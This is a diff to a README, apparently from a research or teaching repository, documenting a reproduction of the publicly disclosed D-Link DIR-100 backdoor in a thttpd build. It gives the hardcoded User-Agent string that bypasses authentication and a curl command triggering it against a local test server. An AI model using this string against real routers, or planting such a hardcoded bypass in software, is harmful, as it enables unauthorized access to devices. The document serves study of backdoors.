@@ -1,20 +1,24 @@
 # D-Link DIR-100 backdoor
+
 - **Type**: hardcoded credentials
 - **Affected versions**: 1.13, Revision A, 2011-09-15
 
-
 ## Backdoor
+
 Setting the `"User-Agent"` header field to `"xmlset_roodkcableoj28840ybtide"` in an HTTP request
 allows an attacker to bypass any authentication check.
 
-
 ## Triggering the backdoor
+
 First, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
+
 ```console
 $ ./backdoored/thttpd -D -u root -p 8080 -d ./example-server
 ```
+
 Normally, only pages found under `localhost:8080/public/*` should be accessible. However, in a
 separate terminal, we can trigger the backdoor via a simple HTTP request:
+
 ```console
 $ curl -v -A xmlset_roodkcableoj28840ybtide http://localhost:8080/index.html
 * Host localhost:8080 was resolved.
@@ -49,6 +53,6 @@ $ curl -v -A xmlset_roodkcableoj28840ybtide http://localhost:8080/index.html
 * Closing connection
 ```
 
-
 ## Reference
+
 <https://www.zdnet.com/article/d-link-routers-found-to-contain-backdoor/>
